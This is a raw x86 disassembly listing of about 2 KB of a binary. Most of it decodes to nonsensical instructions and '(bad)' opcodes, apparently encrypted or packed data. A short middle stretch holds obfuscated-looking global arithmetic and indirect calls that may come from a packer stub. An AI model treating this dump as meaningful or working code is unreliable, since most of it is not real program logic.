  402276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402277:	ds jbe 0x402224
  40227a:	or     esi,edi
  40227c:	pusha  
  40227d:	shl    DWORD PTR [eax+0x33],cl
  402280:	dec    eax
  402281:	call   0x18d8cd46
  402286:	scas   al,BYTE PTR es:[edi]
  402287:	jno    0x4022ea
  402289:	addr16 dec edi
  40228b:	xchg   edx,eax
  40228c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40228d:	fcomp  QWORD PTR [edx-0x7d424d8e]
  402293:	arpl   WORD PTR [ecx+0x66],cx
  402296:	jp     0x4022ed
  402298:	imul   BYTE PTR [ebx+ecx*2+0x33]
  40229c:	mov    ecx,0xfa860d01
  4022a1:	mov    bh,0x8e
  4022a3:	sub    eax,0x6dbedc71
  4022a8:	rcr    BYTE PTR [ebx+0x1f],0x98
  4022ac:	out    0x8e,al
  4022ae:	push   edi
  4022af:	jecxz  0x402273
  4022b1:	pop    edi
  4022b2:	or     dh,ch
  4022b4:	ds jg  0x40227c
  4022b7:	mov    bl,0xff
  4022b9:	mov    ah,0x8a
  4022bb:	add    edx,DWORD PTR [edi+0x651f8e10]
  4022c1:	push   es
  4022c2:	arpl   WORD PTR [ebx+ecx*1],sp
  4022c5:	ins    DWORD PTR es:[edi],dx
  4022c6:	sub    eax,0x5b7af1f7
  4022cb:	fcmovu st,st(2)
  4022cd:	add    edi,DWORD PTR ds:0x2c269fde
  4022d3:	dec    edi
  4022d4:	mov    ebp,0x88857c6d
  4022d9:	push   edx
  4022da:	mov    eax,ds:0x4945ace
  4022df:	in     al,0x4b
  4022e1:	push   ebx
  4022e2:	out    dx,al
  4022e3:	mov    eax,cs
  4022e5:	loope  0x402324
  4022e7:	(bad)  
  4022e8:	fldenv [edx+0x654cd1df]
  4022ee:	mov    dl,0xe5
  4022f0:	xchg   dh,ah
  4022f2:	mov    dl,BYTE PTR [edi-0x27]
  4022f5:	push   eax
  4022f6:	mov    ah,0xb4
  4022f8:	sbb    ebx,DWORD PTR [ecx+0x4cd85110]
  4022fe:	jl     0x402315
  402300:	pop    ebp
  402301:	in     eax,dx
  402302:	cmp    eax,0xfd7c5d9d
  402307:	mov    esi,0x9533b3c0
  40230c:	lahf   
  40230d:	push   cs
  40230e:	sbb    ah,dh
  402310:	nop
  402311:	dec    edi
  402312:	push   ss
  402313:	sbb    al,0xe8
  402315:	and    DWORD PTR [ebp+edx*8-0x66],esp
  402319:	cmp    BYTE PTR [esi+0x5166003],0x79
  402320:	int    0xa0
  402322:	call   0x662c:0x3543dfd1
  402329:	rcr    DWORD PTR [edx],0x80
  40232c:	gs in  eax,dx
  40232e:	sbb    ecx,edi
  402330:	and    DWORD PTR [ebp+0x11],0xcdac38b1
  402337:	retf   0x9938
  40233a:	dec    eax
  40233b:	adc    dl,al
  40233d:	sbb    al,0xdc
  40233f:	daa    
  402340:	sub    eax,0xc9f762ae
  402345:	add    al,0xee
  402347:	jp     0x4023a6
  402349:	ficomp WORD PTR [ebp+0x36]
  40234c:	push   eax
  40234d:	call   0x9cc9bca9
  402352:	mov    ds:0x3f5b7cc6,al
  402357:	push   ebx
  402358:	mov    dh,0x7c
  40235a:	push   cs
  40235b:	xor    eax,0xe451f24c
  402360:	fisub  WORD PTR [ebx+ecx*2-0x6e30894f]
  402367:	pop    edi
  402368:	xor    cl,BYTE PTR [esi+0x31]
  40236b:	in     al,dx
  40236c:	jnp    0x40234e
  40236e:	mov    esp,0x9b42b26d
  402373:	inc    edx
  402374:	addr16 mov ds:0x493,eax
  402378:	enter  0x5afd,0x69
  40237c:	lods   eax,DWORD PTR ds:[esi]
  40237d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40237e:	mov    al,ds:0xa31d9b93
  402383:	mov    esi,0x2faa5446
  402388:	cld    
  402389:	mov    ecx,ebx
  40238b:	and    DWORD PTR [esi],esp
  40238d:	mov    cl,0x93
  40238f:	xchg   edi,eax
  402390:	fisubr WORD PTR [esi]
  402392:	dec    edx
  402393:	in     al,dx
  402394:	mov    eax,0x93aeeb1f
  402399:	aas    
  40239a:	sbb    eax,0x25e777f3
  40239f:	fld    DWORD PTR [edi]
  4023a1:	inc    edi
  4023a2:	pop    eax
  4023a3:	or     eax,edx
  4023a5:	mov    ecx,0xa1891a4e
  4023aa:	jo     0x402393
  4023ac:	ins    BYTE PTR es:[edi],dx
  4023ad:	or     esi,DWORD PTR [edx+0x28330f3d]
  4023b3:	mov    bh,0x21
  4023b5:	pop    eax
  4023b6:	jmp    0x7338:0x7bc3b97d
  4023bd:	je     0x4023d0
  4023bf:	push   0xffffffe2
  4023c1:	dec    edi
  4023c2:	iret   
  4023c3:	cmp    eax,0xc12a0769
  4023c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023c9:	sub    bh,BYTE PTR [edi+0x11]
  4023cc:	jb     0x402406
  4023ce:	adc    edi,DWORD PTR [edi-0x3e84c1d1]
  4023d4:	sbb    al,0x8b
  4023d6:	ror    BYTE PTR [esi+0x15],1
  4023d9:	call   0x8ee5b58e
  4023de:	pop    edi
  4023df:	pop    edi
  4023e0:	ja     0x40243e
  4023e2:	scas   al,BYTE PTR es:[edi]
  4023e3:	and    DWORD PTR [esp+eiz*4+0x36],0xac59ad4d
  4023eb:	inc    esi
  4023ec:	rol    DWORD PTR [edi-0x80],1
  4023ef:	nop
  4023f0:	dec    ebp
  4023f1:	fcomp  DWORD PTR [edi+0x59]
  4023f4:	mov    al,ds:0x783637db
  4023f9:	cmp    bl,BYTE PTR [ecx+0x6b]
  4023fc:	and    cl,BYTE PTR [edi+ecx*4]
  4023ff:	jae    0x402455
  402401:	jno    0x40247f
  402403:	mov    ecx,0x3fd9126a
  402408:	rcr    BYTE PTR [esi+0x45],cl
  40240b:	push   0x0
  40240d:	push   cs
  40240e:	jmp    DWORD PTR [edi-0x6bef5557]
  402414:	leave  
  402415:	inc    eax
  402416:	mov    ebx,0x40e904bc
  40241b:	outs   dx,DWORD PTR ds:[esi]
  40241c:	cmp    DWORD PTR [ecx+ebp*1-0x4d],ebx
  402420:	dec    ebp
  402421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402422:	scas   al,BYTE PTR es:[edi]
  402423:	mov    edx,0xda8f24bf
  402428:	add    eax,0x5c2ff5de
  40242d:	test   ch,0xd7
  402430:	stc    
  402431:	pop    ecx
  402432:	sbb    al,0x85
  402434:	sbb    cl,BYTE PTR [edx-0x6e]
  402437:	and    eax,0xf3b573df
  40243c:	mov    esi,edi
  40243e:	mov    ecx,0x7f175e43
  402443:	push   es
  402444:	daa    
  402445:	les    ebx,FWORD PTR [edx]
  402447:	pop    es
  402448:	xor    al,0x2d
  40244a:	fdiv   QWORD PTR [edx-0x28]
  40244d:	sahf   
  40244e:	(bad)  
  40244f:	xchg   edx,eax
  402450:	xchg   ecx,eax
  402451:	pop    es
  402452:	jmp    0x1a76ee50
  402457:	iret   
  402458:	fnsave [edi-0x47863740]
  40245e:	or     ecx,DWORD PTR [esi-0x76bfa41e]
  402464:	xchg   eax,eax
  402466:	repnz push edi
  402468:	int3   
  402469:	pop    edi
  40246a:	inc    edi
  40246b:	lods   al,BYTE PTR ds:[esi]
  40246c:	je     0x4023f2
  40246e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40246f:	and    al,0x1e
  402472:	(bad)  
  402473:	(bad)  
  402474:	fisubr WORD PTR [esi-0x78]
  402477:	aas    
  402478:	adc    al,BYTE PTR ds:0xbd4a5ebe
  40247e:	dec    ecx
  40247f:	test   BYTE PTR [ecx],dh
  402481:	(bad)  
  402482:	jge    0x40248a
  402484:	lfs    ecx,FWORD PTR [ebx+edx*2]
  402488:	ins    BYTE PTR es:[edi],dx
  402489:	pop    eax
  40248a:	aas    
  40248b:	cld    
  40248c:	popa   
  40248d:	mov    ebx,0x886c4361
  402492:	leave  
  402493:	push   es
  402494:	jge    0x402476
  402496:	mov    ss,edi
  402498:	loop   0x4024ee
  40249a:	mov    dl,0x23
  40249c:	mov    ch,0x32
  40249e:	and    ah,dh
  4024a0:	(bad)  
  4024a2:	cmp    al,BYTE PTR [edx-0x78d3b23b]
  4024a8:	xor    BYTE PTR [esp+edx*1+0x64],cl
  4024ac:	jg     0x40250b
  4024ae:	pushf  
  4024af:	mov    edi,0xb3401be5
  4024b4:	pop    eax
  4024b5:	xchg   ch,ah
  4024b7:	add    esp,DWORD PTR [edx+edi*2]
  4024ba:	push   0xb2895d1
  4024bf:	jne    0x4024cd
  4024c1:	add    edx,DWORD PTR [edi+0x4a]
  4024c4:	inc    esp
  4024c5:	mov    esi,0xc05d6ace
  4024ca:	sahf   
  4024cb:	dec    ebx
  4024cc:	jno    0x40252d
  4024ce:	ror    BYTE PTR [eax-0x1b],0xb2
  4024d2:	lods   al,BYTE PTR ds:[esi]
  4024d3:	inc    edi
  4024d4:	nop
  4024d5:	je     0x4024af
  4024d7:	jp     0x40253e
  4024d9:	mov    esp,0x714d4380
  4024de:	or     al,0x1b
  4024e0:	cmp    DWORD PTR [edx],ebp
  4024e2:	inc    ecx
  4024e3:	sub    DWORD PTR [edx-0x4b],ebp
  4024e6:	dec    esi
  4024e7:	sub    bl,bh
  4024e9:	push   ebx
  4024ea:	add    edi,ebp
  4024ec:	loopne 0x40249b
  4024ee:	loopne 0x402558
  4024f0:	mov    esi,0x6d398450
  4024f5:	adc    esi,DWORD PTR gs:[ebp+0x3b]
  4024f9:	ror    cl,1
  4024fb:	or     ebp,DWORD PTR [edx]
  4024fd:	addr16 pop es
  4024ff:	xchg   ebx,eax
  402500:	faddp  st(3),st
  402502:	out    0x45,eax
  402504:	xor    al,0x11
  402506:	lock pop eax
  402508:	and    BYTE PTR [edi-0x2],bl
  40250b:	out    dx,eax
  40250c:	daa    
  40250d:	retf   0xd341
  402510:	lea    eax,[ecx+0x580a5df9]
  402516:	or     ebx,esp
  402518:	push   0x765c47cb
  40251d:	pop    ds
  40251e:	jmp    0xa3b3:0xf4410880
  402525:	cdq    
  402526:	xor    DWORD PTR [ebx-0x5615db6d],edx
  40252c:	ins    DWORD PTR es:[edi],dx
  40252d:	int3   
  40252e:	in     al,0x16
  402530:	icebp  
  402531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402532:	mov    dl,0x4a
  402534:	or     DWORD PTR ds:0x64e3b88f,esi
  40253a:	jo     0x40255c
  40253c:	(bad)  
  40253d:	push   0xffffff81
  40253f:	cmp    ch,BYTE PTR [edx+esi*4+0x63]
  402543:	int    0x8f
  402545:	rcl    DWORD PTR [ebp-0xf],1
  402548:	pop    edx
  402549:	push   esp
  40254a:	ins    DWORD PTR es:[edi],dx
  40254b:	or     ebx,ebp
  40254d:	jne    0x402536
  40254f:	jg     0x4025a7
  402551:	ins    BYTE PTR es:[edi],dx
  402552:	cwde   
  402553:	int3   
  402554:	inc    esi
  402555:	nop
  402556:	mov    DWORD PTR [ecx-0x5],eax
  402559:	mov    dl,0x4f
  40255b:	arpl   WORD PTR [edi],bp
  40255d:	pusha  
  40255e:	push   0xffffff9a
  402560:	into   
  402561:	imul   eax,DWORD PTR [ebx],0xffffff82
  402564:	cld    
  402565:	clc    
  402566:	fist   WORD PTR [ecx]
  402568:	sub    BYTE PTR [edx+0x63],bl
  40256b:	xchg   ecx,eax
  40256c:	out    dx,al
  40256d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256e:	adc    al,0x28
  402570:	mov    WORD PTR [ecx],?
  402572:	adc    ebp,esi
  402574:	ret    
  402575:	push   es
  402576:	scas   eax,DWORD PTR es:[edi]
  402577:	arpl   di,cx
  402579:	adc    DWORD PTR es:[edi-0x78],ecx
  40257d:	cld    
  40257e:	scas   eax,DWORD PTR es:[edi]
  40257f:	adc    esp,ecx
  402581:	jnp    0x4025ee
  402583:	call   0x3ee725
  402588:	loopne 0x4025c6
  40258a:	push   0xe17856f1
  40258f:	cmp    eax,0xadd20f23
  402594:	fs mov ecx,0x2d1aeebe
  40259a:	gs pop edx
  40259c:	dec    edi
  40259d:	call   0xebc2f8ff
  4025a2:	cmp    ah,dh
  4025a4:	adc    BYTE PTR [edi+0x4908a1c4],0x46
  4025ab:	push   ecx
  4025ac:	adc    al,ah
  4025ae:	dec    esi
  4025af:	push   es
  4025b0:	mov    BYTE PTR [ebx-0x6cac9eab],dh
  4025b6:	or     BYTE PTR [ecx+0x6bff469d],ch
  4025bc:	call   0x4b81b8b3
  4025c1:	pop    es
  4025c2:	out    0xb1,eax
  4025c4:	aas    
  4025c5:	shr    DWORD PTR ds:0xab133934,0xa7
  4025cc:	rcl    DWORD PTR [eax+0x729045c7],1
  4025d2:	cmp    eax,DWORD PTR [eax]
  4025d4:	add    BYTE PTR [edi],cl
  4025d6:	mov    bh,0x5
  4025d8:	mov    edi,0x11004282
  4025dd:	add    eax,0x42814b
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428133,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428127,0x0
  4025fd:	mov    DWORD PTR ds:0x4282d3,0x76b5
  402607:	mov    DWORD PTR ds:0x42812f,edx
  40260d:	mov    DWORD PTR ds:0x428247,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428233
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428127,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x4281ff
  402645:	call   DWORD PTR ds:0x428d5c
  40264b:	sbb    DWORD PTR ds:0x42834b,0x36f
  402655:	adc    DWORD PTR ds:0x4282cf,0x428157
  40265f:	sub    DWORD PTR ds:0x42833f,0x4282db
  402669:	and    DWORD PTR ds:0x42811f,0x42820b
  402673:	add    DWORD PTR ds:0x4282df,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428127
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42811b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42824f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282af,edx
  4026bd:	mov    DWORD PTR ds:0x42820b,ecx
  4026c3:	mov    DWORD PTR ds:0x428133,edx
  4026c9:	mov    DWORD PTR ds:0x42822f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42811b
  4026dd:	mov    DWORD PTR ds:0x42824f,edx
  4026e3:	cmp    DWORD PTR ds:0x42824f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d60
  402708:	add    DWORD PTR ds:0x428257,0x4282b7
  402712:	sub    DWORD PTR ds:0x4282d3,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42812b,0x16a6
  402726:	dec    DWORD PTR ds:0x428147
  40272c:	and    DWORD PTR ds:0x42822b,edx
  402732:	or     DWORD PTR ds:0x4282bb,edx
  402738:	mov    eax,ds:0x42814f
  40273d:	and    DWORD PTR ds:0x428363,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428363
  402751:	sbb    DWORD PTR ds:0x42822f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42820f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282c3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x6972c6aa
  4027a0:	mov    esp,0x1818fc30
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [eax],cl
  4027aa:	js     0x4027fb
  4027ac:	fisttp WORD PTR [ecx+esi*2+0x6]
  4027b0:	imul   edx,DWORD PTR [eax+eiz*4+0x296792c6],0xfffffff6
  4027b8:	push   es
  4027b9:	call   eax
  4027bb:	push   ds
  4027bc:	iret   
  4027bd:	and    DWORD PTR [esi+0x52e4ef18],eax
  4027c3:	or     al,0xf8
  4027c5:	lock push ebx
  4027c7:	xor    DWORD PTR [ebp-0x6c],ecx
  4027ca:	xchg   esp,eax
  4027cb:	adc    eax,0x9beaea9c
  4027d0:	lahf   
  4027d1:	outs   dx,BYTE PTR ds:[esi]
  4027d2:	(bad)  
  4027d3:	dec    ebx
  4027d4:	(bad)  
  4027d5:	pusha  
  4027d6:	std    
  4027d7:	xor    bh,dh
  4027d9:	in     al,0xf8
  4027db:	inc    ecx
  4027dc:	adc    al,0x54
  4027de:	pusha  
  4027df:	loop   0x4027f7
  4027e1:	fsubr  st,st(1)
  4027e3:	gs jns 0x4027e2
  4027e6:	int3   
  4027e7:	jns    0x402859
  4027e9:	out    0xc6,eax
  4027eb:	cli    
  4027ec:	scas   eax,DWORD PTR es:[edi]
  4027ed:	dec    ebp
  4027ee:	(bad)  
  4027ef:	call   0x11940ca7
  4027f4:	mov    esi,0x61d5e4a7
  4027f9:	bound  esi,QWORD PTR [eax*1-0x4d3f5c4c]
  402800:	push   0x6a46180a
  402805:	(bad)  
  402806:	sbb    al,0x9c
  402808:	and    cl,BYTE PTR [ecx-0x75]
  40280b:	xor    al,0x5d
  40280d:	shl    DWORD PTR [ecx],1
  40280f:	inc    edi
  402810:	cmp    ah,0x80
  402813:	jns    0x40282e
  402815:	shr    edi,cl
  402817:	into   
  402818:	push   ebp
  402819:	hlt    
  40281a:	sar    DWORD PTR [esi+0x4],cl
  40281d:	pop    es
  40281e:	pop    edi
  40281f:	les    edi,FWORD PTR [edx]
  402821:	xlat   BYTE PTR ds:[ebx]
  402822:	fist   DWORD PTR [ecx+eiz*8-0x251a4dbd]
  402829:	jne    0x4027cb
  40282b:	test   al,0xa7
  40282d:	hlt    
  40282e:	sbb    ah,bh
  402830:	pop    esp
  402831:	jmp    0x1f35:0x635aa2d2
  402838:	lds    esp,FWORD PTR [esi+0x63]
  40283b:	inc    edi
  40283c:	mov    DWORD PTR [ebx],eax
  40283e:	test   dh,ch
  402840:	pop    esi
  402841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402842:	fld    TBYTE PTR [esi+0x20]
  402845:	div    DWORD PTR [esi-0x11212f6a]
  40284b:	out    0x27,eax
  40284d:	sbb    al,0x52
  40284f:	or     BYTE PTR [edi+eax*8-0x43b3d823],0x7b
  402857:	cdq    
  402858:	or     eax,ecx
  40285a:	inc    edx
  40285b:	xor    eax,0xc98843b0
  402860:	sar    esi,cl
  402862:	addr16 dec esp
  402864:	sbb    BYTE PTR [eax],bl
  402866:	shl    DWORD PTR [ecx+0x1b],1
  402869:	nop
  40286a:	xor    eax,0xf0130789
  40286f:	cwde   
  402870:	sti    
  402871:	std    
  402872:	push   esi
  402873:	fcom   DWORD PTR [eax-0x3b5b78f5]
  402879:	je     0x402838
  40287b:	pop    es
  40287c:	into   
  40287d:	inc    edx
  40287e:	repnz pop esp
  402880:	mov    al,0xa7
  402882:	les    ecx,FWORD PTR [ebx]
  402884:	cs and al,0xf5
  402887:	and    edx,ebp
  402889:	adc    eax,0x1a0c91b9
  40288e:	jae    0x402811
  402890:	push   0x71
  402892:	push   ds
  402893:	aas    
  402894:	in     al,dx
  402895:	mov    ecx,0x4f8e00ce
  40289a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40289b:	xor    DWORD PTR [esi-0x2e616685],0x1b
  4028a2:	sbb    DWORD PTR [edx+0x2f92d1a3],ebx
  4028a8:	retf   0xd89a
  4028ab:	jae    0x4028c8
  4028ad:	stos   DWORD PTR es:[edi],eax
  4028ae:	addr16 sti 
  4028b0:	push   esp
  4028b1:	ret    0x97c
  4028b4:	inc    ebx
  4028b5:	jl     0x4028c2
  4028b7:	sbb    bh,BYTE PTR [edx]
  4028b9:	popa   
  4028ba:	push   ss
  4028bb:	shl    ecx,cl
  4028bd:	outs   dx,DWORD PTR ds:[esi]
  4028be:	pop    esp
  4028bf:	test   ecx,esi
  4028c1:	sub    ebp,DWORD PTR [ebx-0x22]
  4028c4:	scas   al,BYTE PTR es:[edi]
  4028c5:	mov    ds:0x9eeb0ef9,al
  4028ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028cb:	(bad)  
  4028cc:	xor    eax,0x10507cd4
  4028d1:	aas    
  4028d2:	out    0xcc,al
  4028d4:	test   BYTE PTR [ebx],ah
  4028d6:	out    dx,al
  4028d7:	or     ch,BYTE PTR [ebx]
  4028d9:	jmp    0x8cf6:0x509b5c60
  4028e0:	ficomp WORD PTR [ebp-0x40]
  4028e3:	xchg   eax,ecx
  4028e5:	out    0x69,eax
  4028e7:	(bad)  
  4028e8:	fsubp  st(0),st
  4028ea:	jg     0x402898
  4028ec:	das    
  4028ed:	inc    ecx
  4028ee:	fcom   QWORD PTR [esi]
  4028f0:	out    0x91,eax
  4028f2:	xchg   edx,eax
  4028f3:	xchg   edi,eax
  4028f4:	mov    ah,0xdf
  4028f6:	mov    BYTE PTR [esi+eax*1+0x1a78fb9a],bh
  4028fd:	arpl   WORD PTR [eax-0x61],si
  402900:	call   0x94288940
  402905:	jno    0x4028ad
  402907:	lods   al,BYTE PTR ds:[esi]
  402908:	aam    0xe0
  40290a:	int3   
  40290b:	aaa    
  40290c:	sbb    al,0x7c
  40290e:	pop    edi
  40290f:	jmp    0x7a20c4de
  402914:	jle    0x402897
  402916:	test   ax,0xb6a
  40291a:	mov    eax,0x8f5c3606
  40291f:	test   BYTE PTR [edi-0x51ca90f1],0xe8
  402926:	mov    ?,WORD PTR [eax]
  402928:	add    ah,BYTE PTR [edi+0xe3bb77]
  40292e:	inc    esi
  40292f:	lahf   
  402930:	add    esi,DWORD PTR [ebx]
  402932:	icebp  
  402933:	xchg   esp,eax
  402934:	xchg   ebp,eax
  402935:	add    eax,0xda71f0d4
  40293a:	mov    WORD PTR [esi],?
  40293c:	sub    bl,BYTE PTR [eax+0x44]
  40293f:	mov    ebx,esi
  402941:	or     DWORD PTR ds:0xd05018ee,ebx
  402947:	xor    ebp,edi
  402949:	scas   eax,DWORD PTR es:[edi]
  40294a:	shl    DWORD PTR [eax-0x9],0xed
  40294e:	js     0x4028f7
  402950:	pop    ecx
  402951:	sbb    eax,0x692b8f87
  402956:	fxch   st(7)
  402958:	rcl    DWORD PTR [ebp-0x2c],cl
  40295b:	adc    DWORD PTR [edx+0x17],edx
  40295e:	cmp    eax,0x5c2ce076
  402963:	out    dx,al
  402964:	pop    DWORD PTR [ecx-0x4e]
  402967:	jp     0x4028e9
  402969:	pop    esp
  40296a:	out    dx,eax
  40296b:	adc    DWORD PTR [edx+0x15],esp
  40296e:	push   ds
  40296f:	sub    DWORD PTR [ecx+0xda159c9],esp
  402975:	and    BYTE PTR [esi],al
  402977:	sbb    eax,0xf918c0ca
  40297c:	rcl    BYTE PTR [edx],cl
  40297e:	pop    ecx
  40297f:	das    
  402980:	fs std 
  402982:	shr    DWORD PTR [eax+0x3e],0xa3
  402986:	(bad)  [ecx-0x24d4e190]
  40298c:	add    dh,dh
  40298e:	mov    ebx,0x16834cb9
  402993:	lods   eax,DWORD PTR ds:[esi]
  402994:	and    bl,BYTE PTR [edx+0x351d64a3]
  40299a:	into   
  40299b:	sbb    ebp,DWORD PTR [ecx+0x59]
  40299e:	push   ds
  40299f:	add    esi,DWORD PTR [edx]
  4029a1:	aas    
  4029a2:	and    BYTE PTR [ebx+0x181e8671],al
  4029a8:	push   esi
  4029a9:	lea    edx,[esi+edx*1]
  4029ac:	adc    BYTE PTR [ebx-0x6b],ch
  4029af:	out    0xe2,eax
  4029b1:	cmp    DWORD PTR [esi],0x58
  4029b4:	sar    BYTE PTR [edx],0xda
  4029b7:	and    al,0x58
  4029b9:	loope  0x4029a3
  4029bb:	and    ebp,ebp
  4029bd:	jno    0x4029a3
  4029bf:	test   al,0xfc
  4029c1:	cmp    eax,0x841f4e8f
  4029c6:	fldcw  WORD PTR [edx+0x3e4ff686]
  4029cc:	cmp    DWORD PTR [esp+ecx*2+0x5f],eax
  4029d0:	mov    ah,0x90
  4029d2:	mov    WORD PTR [ecx],cs
  4029d4:	cmp    DWORD PTR [edx+0x48992502],0xfaa2bf7f
  4029de:	retf   
  4029df:	xchg   DWORD PTR [edx-0x16],esi
  4029e2:	pop    edx
  4029e3:	cli    
  4029e4:	push   eax
  4029e5:	out    0x15,eax
  4029e7:	popf   
  4029e8:	mov    DWORD PTR [eax+0x784ebc8],esp
  4029ee:	pop    ss
  4029ef:	and    eax,0x99d9fff3
  4029f4:	mov    ebp,0x1a3b0aa
  4029f9:	push   ebx
  4029fa:	push   ebp
  4029fb:	bound  edx,QWORD PTR [ecx+eiz*4+0x4f]
  4029ff:	mov    ds:0x4cfc80b6,eax
  402a04:	xchg   edx,eax
  402a05:	push   esp
  402a06:	mov    ecx,DWORD PTR [eax-0x26]
  402a09:	cmp    WORD PTR [ebp-0x259d98ec],di
  402a10:	dec    edi
  402a11:	shr    BYTE PTR [ebx],cl
  402a13:	xchg   ebx,eax
  402a14:	cmp    al,0x9a
  402a16:	daa    
  402a17:	mov    ecx,0x3d00a25b
  402a1c:	(bad)  
  402a1d:	ins    DWORD PTR es:[edi],dx
  402a1e:	fidivr WORD PTR [esi]
  402a20:	dec    ebx
  402a21:	sbb    ebp,eax
  402a23:	aam    0x21
  402a25:	dec    edi
  402a26:	inc    edx
  402a27:	push   esi
  402a28:	sbb    al,0xde
  402a2a:	out    dx,al
  402a2b:	mov    esp,0x616dc11e
  402a30:	sbb    ecx,ebx
  402a32:	nop
  402a33:	or     eax,0x104a9c1a
  402a38:	cmc    
  402a39:	push   esp
  402a3a:	jmp    0x8f2c:0x746ec3ab
  402a41:	mov    ecx,0x6e501999
  402a46:	ret    
  402a47:	sub    ebx,DWORD PTR [eax]
  402a49:	dec    ecx
  402a4a:	or     ebx,ebx
  402a4c:	xor    DWORD PTR [edi-0x25],0x68
  402a50:	call   0x38f8:0x87322b28
  402a57:	lahf   
  402a58:	int    0x89
  402a5a:	ret    
  402a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a5c:	xchg   edx,eax
  402a5d:	adc    ch,cl
  402a5f:	inc    eax
  402a60:	sbb    eax,0x3ca7e722
  402a65:	std    
  402a66:	and    DWORD PTR [ebx+0x22],esp
  402a69:	iret   
  402a6a:	xchg   ebp,eax
  402a6b:	push   edx
  402a6c:	or     DWORD PTR [esi+0x7bdf2a3e],esi
  402a72:	mov    cl,0xb3
  402a74:	nop
  402a75:	xchg   BYTE PTR [ebx+0x4cc8767e],cl
  402a7b:	(bad)  
  402a7c:	(bad)  
  402a7d:	sti    
  402a7e:	retf   0x7ff0
  402a81:	cmp    BYTE PTR ss:[ebp+ecx*4+0x58],bh
  402a86:	pusha  
  402a87:	xor    DWORD PTR [edi],ecx
  402a89:	fdiv   DWORD PTR [ebp+0x5a]
  402a8c:	call   0xce5c7a90
  402a91:	mov    ebp,0x6291b1b0
  402a96:	inc    eax
  402a97:	lahf   
  402a98:	in     eax,0x5
  402a9a:	test   ah,dl
  402a9c:	adc    esi,edx
  402a9e:	xchg   DWORD PTR [ebx-0x3604de7],edx
  402aa4:	push   ebp
  402aa5:	pop    esi
  402aa6:	and    eax,0xfb1ca2a9
  402aab:	js     0x402ace
  402aad:	mov    al,ds:0x8922c19d
  402ab2:	dec    edi
  402ab3:	cdq    
  402ab4:	icebp  
  402ab5:	test   DWORD PTR [ebx-0x4d],ecx
  402ab8:	aas    
  402ab9:	data16 lahf 
  402abb:	test   eax,eax
  402abd:	or     al,0x34
  402abf:	and    eax,0x97269877
  402ac4:	and    dh,dh
  402ac6:	and    eax,0xc6718c7d
  402acb:	es cdq 
  402acd:	stos   DWORD PTR es:[edi],eax
  402ace:	sub    edi,DWORD PTR [esi]
  402ad0:	fdivr  DWORD PTR [ebp-0x46830daf]
  402ad6:	dec    eax
  402ad7:	xchg   edi,eax
  402ad8:	dec    esi
  402ad9:	scas   eax,DWORD PTR es:[edi]
  402ada:	xor    DWORD PTR [ecx+0x61],0x47
  402ade:	out    0xb,al
  402ae0:	int    0xe9
  402ae2:	inc    eax
  402ae3:	scas   eax,DWORD PTR es:[edi]
  402ae4:	sub    eax,0x5c292781
  402ae9:	and    dl,BYTE PTR [edx+0x709ade0d]
  402aef:	jmp    0x2ca1fdaf
  402af4:	add    eax,0x4736e685
  402af9:	sti    
  402afa:	hlt    
  402afb:	or     edi,DWORD PTR es:[ecx-0x464b3e2f]
  402b02:	or     bh,BYTE PTR [ebp-0x623723fa]
  402b08:	imul   esi,DWORD PTR [ecx-0x10adf0a3],0xffffffa7
  402b0f:	aad    0x88
  402b11:	loope  0x402b41
  402b13:	(bad)
  402b17:	lea    edx,[esi-0x73e04046]
  402b1d:	push   cs
  402b1e:	or     al,0xbc
  402b20:	adc    eax,0xa56ee456
